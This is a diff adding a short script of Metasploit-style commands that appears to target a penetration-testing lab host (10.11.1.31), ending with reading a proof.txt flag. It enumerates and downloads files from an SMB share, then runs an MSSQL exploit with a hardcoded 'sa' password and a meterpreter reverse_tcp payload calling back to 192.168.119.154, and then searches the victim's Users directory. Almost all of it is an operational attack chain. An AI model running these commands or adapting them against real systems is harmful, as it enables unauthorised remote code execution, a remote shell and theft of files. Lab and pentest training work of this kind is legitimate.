@@ -1,0 +1,13 @@
+auxiliary/scanner/smb/smb_enumshares; set delay_to_observe 1; set rhosts 10.11.1.31; run;
+
+auxiliary/admin/smb/list_directory; set delay_to_observe 1; set rhosts 10.11.1.31; set smbshare wwwroot; run;
+
+auxiliary/admin/smb/download_file; set delay_to_observe 1; set rhosts 10.11.1.31; set smbshare wwwroot; set rpath login-off.asp.txt; run;
+
+exploit/windows/mssql/mssql_payload; set delay_to_observe 60; set payload windows/meterpreter/reverse_tcp; set lhost 192.168.119.154; set lport <REVSHELL_PORT>; set rhosts 10.11.1.31; set username sa; set password poiuytrewq; run;
+
+# try to find the proof.txt file
+execute_meterpreter_command_in_session; set command search -d C:\\Users -f proof.txt; run;
+
+execute_meterpreter_command_in_session; set command cat C:\\Users\\Administrator\\Desktop\\proof.txt; run;
+
